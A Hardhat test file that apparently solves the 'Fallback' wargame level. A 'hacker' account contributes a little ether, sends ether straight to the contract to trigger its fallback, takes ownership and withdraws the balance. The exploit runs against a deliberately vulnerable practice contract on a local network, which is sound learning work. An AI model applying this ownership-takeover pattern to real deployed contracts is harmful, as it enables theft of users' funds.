const { expect, assert } = require("chai")
const { getNamedAccounts, deployments, ethers } = require("hardhat")
const { deploy, log } = deployments

describe("Fallback Test", function () {
    let deployer, fallback, hacker, deployed

    beforeEach(async function () {
        deployer = (await getNamedAccounts()).deployer
        accounts = await ethers.getSigners()
        hacker = accounts[1]
        if (!deployed) {
            deployed = await deploy("Fallback", {
                from: deployer,
                args: [],
                log: true,
            })
        }
        fallback = await ethers.getContract("Fallback", deployer)
    })

    describe("Deploys the cotract correctly", function () {
        it(" Contract Address", () => {
            assert(fallback.address)
        })
        it("Sends the fund", async () => {
            const fallbackPlayer = fallback.connect(hacker)
            const valueInWei = ethers.utils.parseEther("0.00001")
            await fallbackPlayer.contribute({ value: valueInWei })

            const value = await fallbackPlayer.getContribution()
        })
        it("checks the deployer is owner", async () => {
            const owner = (await fallback.owner()).toString()

            assert.equal(owner, deployer)
        })
        it("Owner changes ", async () => {
            const fallbackPlayer = fallback.connect(hacker)
            const valueInWei = ethers.utils.parseEther("0.00001")
            const tx = await hacker.sendTransaction({
                to: fallbackPlayer.address,
                value: ethers.utils.parseEther("0.00000001"),
            })
            const owner = (await fallback.owner()).toString()

            assert.equal(owner, hacker.address)

            const balance = await fallbackPlayer.getContribution()
            console.log(balance.toString())
            const withdraw45 = await fallbackPlayer.withdraw()
            await withdraw45.wait(1)
            const balance1 = await fallbackPlayer.getContribution()

            console.log(balance1.toString())
        })
    })
})

module.exports.tags = ["fallback","all"]